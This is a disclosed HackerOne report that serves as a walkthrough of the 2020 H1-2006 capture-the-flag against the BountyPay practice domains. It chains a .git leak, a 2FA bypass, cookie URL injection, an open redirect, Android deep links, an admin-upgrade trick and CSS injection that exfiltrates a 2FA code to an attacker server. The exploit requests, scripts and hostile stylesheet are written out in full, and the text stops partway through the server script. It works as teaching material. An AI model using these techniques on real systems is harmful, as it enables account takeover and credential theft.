{
  "id": 893395,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTMzOTU=",
  "url": "https://hackerone.com/reports/893395",
  "title": "[H1-2006 2020] CTF Writeup",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-06-08T00:09:40.988Z",
  "submitted_at": "2020-06-08T00:09:40.988Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "un5h4d0w",
    "url": "/un5h4d0w",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/76ia7hvc7tj98i9tec2e4c56g1wd/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-22T16:24:05.622Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-21T20:49:13.982Z",
  "team_member_agreed_on_going_public_at": "2020-06-22T16:24:05.545Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nThe CTF's objective could be found in the following Twitter post:\n\n{F858468}\n\nAs outlined on `https://hackerone.com/h1-ctf`, all subdomains of `bountypay.h1ctf.com` are in scope.\n\nDoing subdomain enumeration revealed the following subdomains:\n\n* api.bountypay.h1ctf.com\n* app.bountypay.h1ctf.com\n* bountypay.h1ctf.com\n* software.bountypay.h1ctf.com\n* staff.bountypay.h1ctf.com\n* www.bountypay.h1ctf.com\n\nIt was possible to chain multiple vulnerabilities, ultimately completing the task of performing a bounty payout from Marten Mickos' account with the following steps:\n\n1. Leaking source code of a logger on `app.bountypay.h1ctf.com` via a `.git` folder pointing to a public GitHub repository and accessing a leftover logfile referenced in the source code that contains Brian Oliver's credentials for `app.bountypay.h1ctf.com`\n2. Bypassing 2FA on `app.bountypay.h1ctf.com` and getting full access to Brian Oliver's user account\n3. URL injection via cookie value on `app.bountypay.h1ctf.com`, enabling an attacker to issue arbitrary API calls on `api.bountypay.h1ctf.com` with Brian Oliver's privileges\n4. Misusing an open redirect on `api.bountypay.h1ctf.com` via cookie injection on `staff.bountypay.h1ctf.com` to download the BountyPay APK\n5. Completing the Android challenges and retrieving an API token for `api.bountypay.h1ctf.com`\n6. Use the token value in the `X-Token` header to access `/api/staff` on `api.bountypay.h1ctf.com` and create Sandra Allison's user account for `staff.bountypay.h1ctf.com` \n6. Access `staff.bountypay.h1ctf.com` and get admin privileges by reporting a manipulated HTML site to the admins, which triggers an \"upgrade to admin\" request for Sandra Allison's account when being visited\n7. Use the password for Marten Mickos displayed in the \"Admin\" tab of `staff.bountypay.h1ctf.com` on `app.bountypay.h1ctf.com` to login as Marten Mickos. Bypass the 2FA that protects the payout of bounties on `app.bountypay.h1ctf.com` by using malicious stylesheets to retrieve the 2FA code and complete the payout process  to payout the bounty payments for Marten Mickos\n\n\n## Steps To Reproduce:\n\n### 1. Source code leak on app.bountypay.h1ctf.com => user credentials\n\nPerforming directory enumeration on that subdomain revealed that the server returns status code 403 instead of 404 for every directory with the string `*git` (e.g. `.git`, `cgit`,...). \n\nRequesting `https://app.bountypay.h1ctf.com/.git/config` returns the following result:\n\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nTrying to access that repository on github succeeds. The repository contains a single PHP file, `logger.php`:\n\n```\n<?php\n\n$data = array(\n  'IP'        =>  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =>  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =>  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =>  array(\n      'GET'   =>  $_GET,\n      'POST'  =>  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\nNext, I tried to access `/bp_web_trace.log`, which contains the following data:\n\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nThe lines seem to contain a timestamp and base64 encoded data. The decoded data contains a password:\n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nThe credentials `brian.oliver:V7h0inzX` are still valid: When trying to login with them, I did not get the error message `Invalid username / password combination` anymore, but instead I got redirected to a 2FA page.\n\n### 2. Bypassing 2FA on app.bountypay.h1ctf.com => access to user account\n\nThe 2FA page shows detailed information about the structure of the 2FA password (parameter `challenge_response`):\n\n{F858471}\n\nThe 2FA authentication can be easily bypassed because the challenge can be chosen by the user and equals `md5sum(challenge_answer)`.\n\nTherefore, I simply generated a valid pair of challenge - challenge answer as follows:\n\n```\n$ echo -n AAAAAAAAAA | md5sum\n16c52c6e8326c071da771e66dc6e9e57  -\n```\n\nThe following request bypasses the 2FA check for the user `brian.oliver` and completes the login process:\n\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\n\nusername=brian.oliver&password=V7h0inzX&challenge_answer=AAAAAAAAAA&challenge=16c52c6e8326c071da771e66dc6e9e57\n```\n\n### 3. URL injection via cookie value on app.bountypay.h1ctf.com => arbitrary API calls on api.bountypay.h1ctf.com\n\nWhen analyzing the requests made when using `app.bountypay.h1ctf.com` as user `brian.oliver`, I noticed that the cookie value is not encrypted but only base64 encoded.\n\nA decoded cookie looks like follows:\n\n```\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n``` \n\nManipulating the `hash` value invalidates the session, but we can use arbitrary values for `account_id`, e.g.:\n\n```\n{\"account_id\":\"xyz\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nThe `account_id` value is used as part of the API url that gets returned when issuing a GET request to `/statements?month=[month]&year=[year]`. As the URL fragment gets ignored server-side, it is possible to terminate the URL with `#` after the user ID. It is possible to make calls to arbitrary endpoints that cannot be accessed directly by injecting data in the `account_id` field, e.g. retrieving user information instead of the transactions:\n\n```\nGET /statements?month=01&year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sat, 06 Jun 2020 12:46:14 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 205\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK#\\/statements?month=01&year=2020\",\"data\":\"{\\\"account_id\\\":\\\"F8gHiqSdpK\\\",\\\"owner\\\":\\\"Mr Brian Oliver\\\",\\\"company\\\":\\\"BountyPay Demo \\\"}\"}\n```\n\nBase64-decoded cookie value: \n\n```\n{\"account_id\":\"F8gHiqSdpK#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\n### 4. Open redirect on api.bountypay.h1ctf.com => APK download\n\nWhen accessing `https://api.bountypay.h1ctf.com` directly, I discovered a redirect which only works for the following whitelisted URLs:\n\n* `https://www.google.com/search?q=*`, which redirects to google. I first tried to use one of Google's redirector endpoints in order to redirect via google to a host under my control, which could be used to perform another redirect to arbitrary targets, effectively bypassing the whitelist check, but I did not succeed because of a single character (`?`).\n* `https://software.bountypay.h1ctf.com/` seems to be in the whitelist, but is not accessible from the externally - after being redirected I got an nginx error message:\n\n{F858472}\n\nAll other domains aren't on the whitelist, the response contains the error message `URL NOT FOUND IN WHITELIST` or `URL must begin with either http:// or https://`.\n\nHowever, visiting `https://software.bountypay.h1ctf.com/` via the API seems to work with the following base64-decoded cookie value:\n\n```\n{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nThe site seems to require a login, but only accepts POST requests, which I did not manage to submit via the redirect. After giving up on that, I bruteforced directories using the following script using Seclist's `raft-small-directories.txt` wordlist:\n\n```\nimport base64\nimport json\nimport requests\nimport sys\n\n\ndef submit(payload):\n    url = \"https://app.bountypay.h1ctf.com/statements?month=02&year=2019\"\n    token = { \"hash\": \"de235bffd23df6995ad4e0930baac1a2\", \"account_id\": f\"../../redirect?url=https://software.bountypay.h1ctf.com/{payload}#\" }\n    cookies = { \"token\": base64.b64encode(json.dumps(token).encode()).decode() }\n    res = requests.get(url, cookies=cookies)\n    return res\n\n\ndef brute():\n    with open(\"/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\") as f:\n        for line in f:\n            payload = line.strip()\n            res = submit(payload)\n            json_data = json.loads(res.text)\n            data = json_data.get(\"data\")\n            url = json_data.get(\"url\")\n            if not \"404 Not Found\" in data:\n                print(f\"[+] {url}\")\n                print(data)\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        brute()\n    else:\n        payload = sys.argv[1]\n        res = submit(payload)\n        print(res.status_code, res.text)\n```\n\nAfter running the script for a short time, I got a directory listing under `/uploads`:\n\n```\n[+] https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/uploads#/statements?month=02&year=2019\n<html>\n<head><title>Index of /uploads/</title></head>\n<body bgcolor=\"white\">\n<h1>Index of /uploads/</h1><hr><pre><a href=\"../\">../</a>\n<a href=\"/uploads/BountyPay.apk\">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701\n</pre><hr></body>\n</html>\n```\n\nDownloading the API was possible using `wget https://software.bountypay.h1ctf.com/uploads/BountyPay.apk` directly.\n\n### 5. Android challenges\n\nI decompiled the Android app with `apktool` and `dex2jar` and analyzed the source code in` jadx`.\n\nFor interacting with the app I used an Android Studio's AVD manager to spin up an emulator with Android 6. Luckily, the app works under Android 6, this enables loading a Burp certificate and intercept the HTTP(s) traffic generated by the app without troubles. For entering values into text fields I used `adb shell input text [input]` in order to be able to copy-paste values instead of typing them out.\n\nAnalyzing the app revealed 3 interesting classes, `PartOneActivity`, `PartTwoActivity` and `PartThreeActivity`. Thoses classes correspond to the levels that need to be solved in order to complete the challenges.\n\n#### PartOneActivity\n\nThis challenge was actually pretty simple. When starting the app, this activity gets started straightaway. However, only a blank screen was displayed. When clicking on the BountyPay icon in the bottom right corner, `Hint: Deep Links` showed up.\n\nReviewing `AndroidManifest.xml` contains the following Intent filter for `PartOneActivity`:\n\n```\n<activity android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\" android:theme=\"@style/AppTheme.NoActionBar\">\n\t<intent-filter android:label=\"\">\n\t\t<action android:name=\"android.intent.action.VIEW\"/>\n\t\t<category android:name=\"android.intent.category.DEFAULT\"/>\n\t\t<category android:name=\"android.intent.category.BROWSABLE\"/>\n\t\t<data android:host=\"part\" android:scheme=\"one\"/>\n\t</intent-filter>\n</activity>\n```\n\nPartOneActivity processes data from an intent as follows:\n\n```\nif (getIntent() != null && getIntent().getData() != null) {\n  String str = getIntent().getData().getQueryParameter(\"start\");\n  if (str != null && str.equals(\"PartTwoActivity\") && sharedPreferences.contains(\"USERNAME\")) {\n\tstr = sharedPreferences.getString(\"USERNAME\", \"\");\n\tSharedPreferences.Editor editor = sharedPreferences.edit();\n\tString str1 = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n\teditor.putString(\"PARTONE\", \"COMPLETE\").apply();\n\tlogFlagFound(str, str1);\n\tstartActivity(new Intent((Context)this, PartTwoActivity.class));\n  } \n} \n```\n\nAccording to the source code, the URL for starting PartOneActivity via deep link is `one://part?start=PartTwoActivity`.\n\nWhen using that deep link by hosting an HTML file (see PartThreeActivity) on my machine and accessing it via the emulator's browser, I got redirected to PartTwoActivity as expected.\n\n#### PartTwoActivity\n\nIn order to render all components from PartTwoActivity, it needs to be accessed via another deep link URL: `two://part?two=light&switch=on`. The correct values for the query parameters can be found out by reviewing the source code of `PartTwoActivity` in the same manner as for solving `PartOneActivity` and opening the app via link in my self-hosted HTML file (see PartThreeActivity).\n\nAfter that, a value needs to be entered into the text field. The source code that decides if the input is correct and completes `PartTwoActivity` is:\n\n{F858476}\n\nOne needs to enter a value that equals data the gets fetched from Firebase Realtime Database. By intercepting the app's traffic, the required value, `X-Token`, could be found in the websocket requests:\n\n{F858475}\n\nBy entering `Token` into the text input field (`X-` gets appended according to the source code), one can complete PartTwoActivity.\n\n#### PartThreeActivity\n\n`PartThreeActivity` needs to be started via deep link like the first two activities using the following parameter values:\n\n* `three`: `base64(PartThreeActivity)`\n* `switch`: `base64(on)`\n* `header`: `X-Token`\n\nIn order to complete that level, it is necessary to submit a hash from the firebase database:\n\n{F858474}\n\n`PartThreeActivity` can also be solved by watching the network traffic:\n\n{F858473}\n\nIn another websocket request, I could also see a hostname being transmitted: `http://api.bountypay.h1ctf.com` - this hints where the hash could be used in the next stage...\n\nComplete HTML file that contains deep links for all levels:\n\n```\n<!DOCTYPE html>\n<html>\n<head><title>BountyPay App Exploit Page</title></head>\n<body style=\"text-align: center;\">\n    <h1><a href=\"one://part?start=PartTwoActivity\">Start PartOneActivity</a></h1>\n    <h1><a href=\"two://part?two=light&amp;switch=on\">Start PartTwoActivity</a></h1>\n    <h1><a href=\"three://part?three=UGFydFRocmVlQWN0aXZpdHk%3d&amp;switch=b24%3d&amp;header=X-Token\">Start PartThreeActivity</a></h1>\n</body>\n</html>\n```\n\n## Leaked App Token => Creation of staff user account\n\nThe leaked hash, `8e9998ee3137ca9ade8f372739f062c1`, can be used as `X-Token` header for `api.bountypay.h1ctf.com` and allows access to the `/api/staff` endpoint, which was not possible before:\n\nIssuing a GET request to `/api/staff` returns the staff IDs of Brian Oliver and Sam Jenkins.\n\n```\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 23:33:27 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 104\n\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nIssuing a POST request works as well. After fiddling around with content type and request parameters I found out that a POST request with `Content-Type: application/json` and POST parameter `staff_id` seems to be valid syntaxwise, but returns `[\"Invalid Staff ID\"]` for syntactically correct, but arbitrary staff IDs such as `STF:1111111111` and `[\"Staff Member already has an account\"]` for existing staff IDs such as `STF:84DJKEIP38`.\n\nHowever, my initial Twitter recon paid off, I remembered a Sandra Allison account following BountyPayHQ with the following post:\n\n{F858477}\n\nThe staff ID from the badge seems to work (Sandra probably did not obtain an account for the API yet):\n\n``` \nPOST /api/staff HTTP/1.1\nContent-Length: 25\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nstaff_id=STF%3a8FJ3KFISL3\n\n\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sat, 06 Jun 2020 15:05:34 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n### 6. Privilege escalation: Staff user account => Admin access\n\nLogging in with `sandra.allison` and password `s%3D8qB8zEpMnc*xsz7Yp5` works at `https://staff.bountypay.h1ctf.com`.\n\nThe logged-in part of the website can be used by staff members for receiving messages from admins. One can see a welcome ticket in the \"Support Tickets\" section - replies are currently disabled. In the \"Profile\" section, staff members can change their profile name and choose from one of three avatars.\n\nWhen trying out all possible actions and looking at requests / responses in BurpSuite, some things caught my attention:\n\n* The website uses templates for displaying content. The template name is submitted via the HTTP GET parameter `template`. I bruteforced additional values for that parameter with `ffuf` and found out that possible values are `login` (which displays the login page), `home` (used for most sections of the login area), `ticket` (used in the tickets section for displaying the welcome message) and `admin` (not accessible with that user - when trying to access it, the error message `No Access to this resource` gets returned).\n* When manipulating the request submitted when changing profile data, special characters are stripped from the data, however, it is possible to use blanks. It is possible to use invalid values for the `avatar` parameter, the backend does not refuse to save them. When looking for reflections of the parameters submitted, I noticed that the `avatar` parameter gets reflected on the ticket page as well as on the profile pages in the `class` attribute of an HTML `div` element.\n* At the bottom of the page, there is a `Report This Page` link. When clicking on it, a dialog with the following text is displayed:\n\n```\nIs there something wrong with this page? If so hit the \"Report Now\" button and the page will be sent over to our admins to checkout.\n\nPages in the /admin directory will be ignored for security\n```\n\n* There is a custom JavaScript file which handles clicking on different tabs to navigate to different parts of the logged-in part of the website, submission of the \"Report This Page\" request which can be triggered by clicking on the \"Report Now\" button in the reporting dialog as well as the submission of an \"Upgrade To Admin\" function which seems to give users admin privileges.\n\n```\n$('.upgradeToAdmin').click(function () {\n  let t = $('input[name=\"username\"]').val();\n  $.get('/admin/upgrade?username=' + t, function () {\n    alert('User Upgraded to Admin')\n  })\n}),\n$('.tab').click(function () {\n  return $('.tab').removeClass('active'),\n  $(this).addClass('active'),\n  $('div.content').addClass('hidden'),\n  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),\n  !1\n}),\n$('.sendReport').click(function () {\n  $.get('/admin/report?url=' + url, function () {\n    alert('Report sent to admin team')\n  }),\n  $('#myModal').modal('hide')\n}),\ndocument.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));\n\n```\n\nObviously, the goal is to somehow trigger the \"Upgrade To Admin\" functionality. As the current user cannot issue that request, an Admin has to be tricked into submitting that request. \n\nXSS is not possible because all special characters are stripped from user input, therefore, the \"Report This Page\" functionality must be misused for that.\n\nIn order to achieve that, I needed two conditions to be met by the reported page's HTML:\n\n1. There must be an `input` element with the `name` attribute set to `username`, containing the value `sandra.allison`\n2. A click on an element with the class `upgradeToAdmin` must be triggered in the background when visiting the manipulated page without any sort of user interaction\n\nThe only `input` field meeting the first requirement can be found in the `login` template. When submitting the `username` parameter in the query string, it luckily is set as value in that input field.\n\nAs stated before, it is possible to additionally assign arbitrary classes to a `div` element in the ticket and profile view. What if we change a `div` element into a button by adding the `button` class (as well as `btn btn-primary` because the page uses Bootstrap, just to be sure that the `div` is clickable) and the `upgradeToAdmin` class in order to cause a click on that button to submit the \"Upgrade to admin\" request?\n\nBut how to create a click event without user interaction? Luckily, the custom javascript file helps us again here: When adding the URL fragments `tab1`, `tab2` or `tab3` to the URL, a click on the corresponding tab (or any element with the `tabX` class gets triggered in the background. Nice!\n\nThe only problem left is that we need at least two different templates to be loaded at the same time in order to put a single page together that chains all that things into a usable exploit. Luckily, that is no problem as well. I found out that it is possible to load multiple templates by submitting an array value for the `template` parameter. However, it took me some time to complete that part of the CTF due to a strange behaviour of the site: I first used `template[0]=x&template[1]=y` for specifying multiple templates, which perfectly works in the browser, but does not have any effect when triggering that via the \"Report This Page\" functionality. After changing the syntax to `template[]=x&template[]=y`, the same request worked without any changes.\n\nLet's summarize that into an exploit: In order to upgrade privileges, the following steps must be taken:\n\n1. Change profile data with the following request:\n\n```\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nConnection: close\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\nUpgrade-Insecure-Requests: 1\n\nprofile_name=sandra&profile_avatar=tab3+upgradeToAdmin+btn+btn-primary+button\n```\n\n2. Submit the following URL via the \"Report This Page\" functionality: `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3` \n\nThe corresponding request contains that URL in URL-encoded base64 and looks as follows:\n\n```\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjM%3d HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hvSVg2SUJZVlAya2RZa1IvaFJqQTZldmswcmk0WXptV1VFMmZYRUtMU0lteDNtSFlWNVhuNGdmTnJLSUJsNmZ2MVpBK3diZDNTYWZPVlF3QVQwTnI4eFBseFp1V3ZvcWxzVEdjMUpKWUVxRlZVRmU0YWV0Z2N2bGRRemlKUno0UnFrdEE9\n```\n\nEt voila, the response contains another cookie:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 17:42:21 GMT\nContent-Type: application/json\nConnection: close\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hvSVg2SUJZVlAya2RZa1IvaFJqQTZldmswcmk0WXptV1VFMmZYRUtMU0lteDNtSFlWNVhuNGdmTlZEWXduMEpHVFlBK3diZDNTYWZPVlF3QVQwTnI4eEtseFpMR2dvdjVnVERjd2Raa0QrRkVNU084WEtkNGY3d1JYbFNkU3k0bzRrdEE9; expires=Tue, 07-Jul-2020 17:42:21 GMT; Max-Age=2592000; path=/\nContent-Length: 19\n\n[\"Report received\"]\n```\n\nAfter reloading the page using that cookie, an additional tab got added to the page, containing an admin section with passwords for `brian.oliver` and `marten.mickos`!\n\n{F858479}\n\n### 7. 2FA bypass => bounty payout\n\nConsidering Brian Oliver's password we retrieved from the staff's Admin page, it looks like the credentials are valid for `https://api.bountypay.h1ctf.com`. As the objective is to help Marten Mickos pay out bounties, it looks like we're very close to the flag. However, there is one additional bypass needed to complete the task...\n\nLogging in with username `marten.mickos` and password `h&H5wy2Lggj*kKn4OD&Ype` succeeds at `https://api.bountypay.h1ctf.com` (when using the MD5 2FA bypass we used for Brian Oliver) as expected. When loading the transactions for May 2020, an open payment is displayed:\n\n{F858480}\n\nHowever, it's not as simple as clicking on the `Pay` button. There is another 2FA challenge that needs to be completed:\n\n{F858481}\n\nThe 2FA cannot be bypassed with the MD5 method from before, that would have been too easy.\n\nWhen looking at the 2FA flow, I noticed a strange request:\n\n```\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nConnection: close\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\nUpgrade-Insecure-Requests: 1\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\nThe `app_style` parameter contains a full URL. I assumed that I might be able to point it to a server under my control and extract information via CSS injection.\n\nIndeed, when pointing it at my server, I noticed requests from a headless chrome. The fact that the request did not seem to come from an application processing stuff but from a browser immediately pointed me towards CSS injection. Indeed - it was possible to make callbacks when a HTML element satisfies certain conditions by forcing the browser to load my own stylesheet that sets the `background:url` to another URL that points to the attacker server on elements using CSS regexes, e.g.:\n\n```\ninput[name^=\"code\"]{ background:url(\"https://[attackerserver]:9999/log\"); }\n```\n\nGreat! Luckily, searching for an `input` element starting with a `name` attribute with a value starting with `code` was my first (more or less educated) guess, but it took me some time to figure out the purpose of it. First I thought that it is just a single input field and wasted some time wondering why I did not get any results when querying for the content of the `value` attribute. After correctly guessing the next character, which was an underscore, it came to my mind that there could maybe be multiple `code_*` input fields and indeed: there is `code_1`  to `code_7`, which fits to the HTML `input` field for the challenge answer having a max length of 7. Therefore, I suspected that each input field contains one character of the 2FA code, which indeed was the case.\n\nAfter knowing the input fields to target, I wrote a small bash script that generates an evil CSS stylesheet for revealing the values of those fields when the victim browser loads it instead of the real CSS:\n\n```bash\n#!/bin/bash\n\nfor i in {1..7}; do\n        for v in {0..9}; do echo \"input[name=\"code_$i\"][value=\"$v\"]{ background:url(\\\"https://[attackerserver]:9999/log_$i/$v\\\"); }\"; done\n        for v in {A..Z}; do echo \"input[name=\"code_$i\"][value=\"$v\"]{ background:url(\\\"https://[attackerserver]:9999/log_$i/$v\\\"); }\"; done\n        for v in {a..z}; do echo \"input[name=\"code_$i\"][value=\"$v\"]{ background:url(\\\"https://[attackerserver]:9999/log_$i/$v\\\"); }\"; done\ndone\n```\n\nAs the browser only seems to load CSS from an SSL website, I wrote a small script for my evil HTTPS Server in Python and placed it on my VPS:\n\n\n```python\n$ cat httpserver.py \nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\nimport logging\n\nevil_css = open(\"evil.css\", \"rb\").read()\n\nclass SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        if self.path == \"/css\":\n            # logging.error(self.headers)\n            self.send_response(200)\n            self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n            self.send_header(\"Content-Type\", \"text/css\")\n            self.end_headers()\n            self.wfile.write(evil_css)\n        else:\n            # logging.error(self.headers)\n            